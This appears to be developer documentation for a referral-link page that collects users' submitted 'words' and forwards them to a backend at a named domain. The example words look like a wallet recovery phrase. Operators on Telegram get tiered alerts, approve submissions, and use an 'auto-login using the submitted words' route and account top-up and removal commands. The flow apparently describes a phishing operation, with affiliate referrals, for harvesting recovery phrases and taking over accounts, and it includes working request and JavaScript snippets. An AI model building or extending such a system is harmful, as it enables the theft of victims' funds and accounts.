# Referral Word Submission Flow

**Status: Done for the client demo.**

The client referral flow is already connected. A user opens a referral URL, submits words, and the backend sends the Telegram alert according to the Telegram user's level.

## Client referral link

The frontend site is:

```text
https://truxhubline.space
```

Use this referral link format:

```text
https://truxhubline.space/client?ref=REFERRAL_CODE
```

Example:

```text
https://truxhubline.space/client?ref=abc123456789
```

The backend API base URL is:

```text
https://api.truxhubline.space
```

## Client word submission

The client page reads the `ref` query parameter and sends it with the word submission:

```http
POST https://api.truxhubline.space/api/words
Content-Type: application/json

{
  "title": "Client visit",
  "words": "market river window signal yellow",
  "referral": "abc123456789",
  "createdBy": "client-test"
}
```

The client already reads `ref` and sends it as `referral`:

```js
const referralCode = new URLSearchParams(window.location.search).get('ref') || ''

await api.post('/words', {
  title,
  words,
  referral: referralCode || undefined,
  createdBy: 'client-test',
})
```

The backend route is:

```text
POST https://api.truxhubline.space/api/words
```

If the words do not already belong to an account, the backend sends an approval notification to Telegram. The referral code is passed into the Telegram recipient filter.

## Telegram alert levels

- **Level 1:** receives every word approval alert.
- **Level 2:** receives alerts only when the submitted referral code is assigned to that Telegram user and the referral link is active.

## Telegram admin flow status

The Telegram webhook and alert delivery are connected. The current bot flow is:

1. A Telegram user sends `/start` to the bot.
2. The bot stores the chat as pending.
3. An authorized Telegram user can approve or reject word alerts with the inline buttons.
4. Authorized users can use `Account List`, `Account Help`, `/account show`, `/account topup`, and `/account remove`.
5. `Stop Alerts` or `/stop` disables alerts for that chat.

Assigning a new Telegram user to level 1 or level 2 is done through the web admin or referral access API:

```http
PUT https://api.truxhubline.space/api/referrals/telegram-users/TELEGRAM_CHAT_ID
Content-Type: application/json

{
  "alertLevel": "level2",
  "authorized": true,
  "referralIds": [12]
}
```

The web admin Telegram authorization flow, client referral submission, and alert filtering are done.

## Client routes

| Method | Route | Purpose |
| --- | --- | --- |
| `POST` | `/api/words` | Submit words with an optional `referral` code |
| `GET` | `/api/words/:id/status` | Check approval status |
| `POST` | `/api/words/auto-login` | Log in using the submitted words |
## Telegram webhook routes

The Telegram router is available at both `/telegram` and `/api/telegram`. The deployed API uses:

```text
https://api.truxhubline.space/api/telegram
```

The webhook URL is:

```text
https://api.truxhubline.space/api/telegram/webhook/<TELEGRAM_WEBHOOK_SECRET>
```

| Method | Route | Purpose |
| --- | --- | --- |
| `POST` | `/api/telegram/set-webhook` | Set the Telegram webhook |
| `POST` | `/api/telegram/reset-webhook` | Reset the Telegram webhook |
| `POST` | `/api/telegram/delete-webhook` | Delete the Telegram webhook |
| `GET` | `/api/telegram/status` | Check Telegram configuration |
| `GET` | `/api/telegram/webhook-info` | Inspect the Telegram webhook |
| `POST` | `/api/telegram/webhook/:secret` | Receive Telegram updates |

## Completed demo flow

1. Open `/client?ref=CODE`.
2. Submit words.
3. The backend sends the alert to level 1 users.
4. The backend sends the alert to level 2 users only when the referral is assigned to them.

This client flow is done. No web-admin page is required for the client submission flow.
